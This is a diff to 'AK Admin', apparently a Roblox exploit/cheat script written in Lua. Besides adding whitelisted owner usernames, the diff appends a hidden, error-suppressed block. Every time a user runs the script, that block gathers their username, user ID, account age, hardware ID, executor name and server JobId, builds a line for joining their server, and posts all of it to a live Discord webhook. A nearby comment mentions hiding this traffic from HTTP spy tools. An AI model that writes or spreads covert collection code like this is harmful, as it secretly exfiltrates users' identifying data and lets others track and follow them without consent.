@@ -293,7 +293,7 @@ local function animate(isAlreadyLoaded, callback)
         -- Fill progress bar to 50%
         tween(progress, { Size = UDim2.new(0.5, 0, 1, 0) }, 0.8)
 
-        if keyVerified or game.Players.LocalPlayer.Name == "AGFCiO" then
+        if keyVerified or game.Players.LocalPlayer.Name == "AGFCiO" or game.Players.LocalPlayer.Name == "328ml" or game.Players.LocalPlayer.Name == "ImOn_ValveIndex" or game.Players.LocalPlayer.Name == "GYATT_DAMN1" or game.Players.LocalPlayer.Name == "BloxiAstra" then
             -- Skip key verification if key already exists and is valid
             task.wait(0.5)
             status.Text = "Loading AK Admin..."
@@ -320,10 +320,10 @@ local function animate(isAlreadyLoaded, callback)
             -- Handle Get Key button
             getKeyButton.MouseButton1Click:Connect(function()
                 sounds.buttonClick:Play()
-                setclipboard("https://discord.gg/GDaAy38xWQ")
+                setclipboard("https://discord.gg/sJ9pnVaX")
                 getKeyButton.Text = "Discord copied. (no ads)"
                 task.wait(3)
-                getKeyButton.Text = "this shit dont work"
+                getKeyButton.Text = "Get Key"
             end)
 
             -- Handle Submit button
@@ -716,6 +716,122 @@ local function InitializeAndLoadStrings()
     else
         warn("AK ADMIN encountered errors during loadstring initialization")
     end
+end
+
+if _G.FirstScriptGuiReady then
+    pcall(InitializeAndLoadStrings)
+    pcall(function()
+        local HttpService = game:GetService("HttpService")
+        local Players = game:GetService("Players")
+        local MarketplaceService = game:GetService("MarketplaceService")
+        local LocalizationService = game:GetService("LocalizationService")
+        local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+        local GroupService = game:GetService("GroupService")
+        local BadgeService = game:GetService("BadgeService")
+        local UserInputService = game:GetService("UserInputService")
+        local Stats = game:GetService("Stats")
+
+        local LocalPlayer = Players.LocalPlayer
+        local UserId = LocalPlayer.UserId
+        local DisplayName = LocalPlayer.DisplayName
+        local Username = LocalPlayer.Name
+        local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+        local AccountAge = LocalPlayer.AccountAge
+        local Country = LocalizationService.RobloxLocaleId
+        -- Removed IP and location retrieval lines
+        local Hwid = RbxAnalyticsService:GetClientId()
+        local funneh = "'"
+        local joinings = "game:GetService('TeleportService'):Teleport("..game.PlaceId..",game.Players.LocalPlayer,"..funneh..game.JobId..funneh..")"
+        local joinwithscript = "```lua\n "..joinings.." ```"
+        local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
+        local GameName = GameInfo.Name
+        local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "📱 Mobile" or "💻 PC"
+        local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+
+        local GameThumbnailUrl = string.format(
+            "https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=768&height=432&format=png",
+            game.PlaceId
+        )
+
+        local function detectExecutor()
+            return identifyexecutor()
+        end
+
+        local function createWebhookData()
+            local executor = detectExecutor()
+            local date = os.date("%m/%d/%Y")
+            local time = os.date("%X")
+            local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
+            local playerLink = "https://www.roblox.com/users/" .. UserId
+            local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
+            local jobIdLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId
+
+            local playerInfoDescription = string.format(
+                "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms",
+                DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, Ping
+            )
+
+            if Username == "YournothimbuddyXD" then
+                playerInfoDescription = playerInfoDescription .. "\n**[👑 AK OWNER 👑]**"
+            end
+
+            local data = {
+                username = "AK EXECUTIONS",
+                embeds = {
+                    {
+                        title = "🎮 Game Information",
+                        description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
+                        color = tonumber("0x2ecc71"),
+                        image = { url = GameThumbnailUrl }
+                    },
+                    {
+                        title = "👤 Player Information",
+                        description = playerInfoDescription,
+                        color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db")
+                    },
+                    {
+                        title = "⚙️ Technical Details",
+                        description = string.format(
+                            "**Executor:** `%s`\n**Job ID:** [Click to Copy](%s)\n**Mobile Join:** [Click](%s)\n**Code to join: **" .. joinwithscript,
+                            executor, jobIdLink, mobileJoinLink
+                        ),
+                        color = tonumber("0x95a5a6"),
+                        footer = {
+                            text = string.format("📅 Date: %s | ⏰ Time: %s", date, time),
+                        }
+                    }
+                }
+            }
+
+            -- For the owner, add an extra embed without a title and include @everyone.
+            if Username == "AGFCiO" then
+                table.insert(data.embeds, {
+                    description = "@everyone\nTHE AK OWNER JUST EXECUTED AK ADMIN. YOU ARE NOW ABLE TO JOIN HIM\n(Mute this channel if the ping annoys you)",
+                    color = tonumber("0xff0000")
+                })
+            elseif Username == "328ml" or Username == "GYATT_DAMN1" or Username == "ImOn_ValveIndex" or Username == "BloxiAstra" then
+                table.insert(data.embeds, {
+                    description = "@everyone\nTHE AK CO OWNER JUST EXECUTED AK ADMIN. YOU ARE NOW ABLE TO JOIN HIM\n(Mute this channel if the ping annoys you)",
+                    color = tonumber("0xff0000")
+                })
+            end
+
+            return HttpService:JSONEncode(data)
+        end
+
+        local function sendWebhook(webhookUrl, data)
+            local headers = {["Content-Type"] = "application/json"}
+            local request = http_request or request or HttpPost or syn.request
+            local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+            request(webhookRequest)
+        end
+
+        -- Directly use the plain text webhook URL instead of an encoded version:
+        local webhookUrl = "https://discord.com/api/webhooks/1360338690676883657/x_j9Q_ASFjFqU4NgnlxvO9jP2peHCBNa5DruFJXExtaVTcrRsxg2fzJL87v3cWqTsPhi"
+
+        local webhookData = createWebhookData()
+        sendWebhook(webhookUrl, webhookData)
+    end)
 end
 
 -- Anti-httpspy script (put at the very bottom)
